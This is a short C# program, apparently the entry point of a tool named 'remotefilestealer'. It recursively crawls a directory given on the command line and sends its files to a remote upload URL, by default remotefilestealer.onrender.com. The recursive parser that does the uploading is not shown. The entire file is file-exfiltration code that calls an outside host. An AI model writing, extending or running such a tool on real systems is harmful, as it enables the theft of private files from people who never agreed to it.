using System;
using System.IO;

public class MainClass {
    public static string path = "practice/";
    public static string serverUrl = "http://remotefilestealer.onrender.com/upload";//"http://127.0.0.1:8080/upload";
    public static void Main(String[] args) {
        if (args.Length == 1) {
            path = args[0];
        } else if (args.Length == 2) {
            path = args[0];
            serverUrl = args[1];
        } else {
            Console.WriteLine("No arguments supplied, running with defaults");
        }
        Console.WriteLine("Crawling " + path + " and uploading to " + serverUrl);

        if (!Directory.Exists(path)) {
            Console.WriteLine("Specified Directory Dosen't Exist! " + path);
            return;
        }


        // FileUploader.UploadFile(path, "http://127.0.0.1:8080/upload");

        RecursiveParser parser = new RecursiveParser(path, serverUrl);
    }
}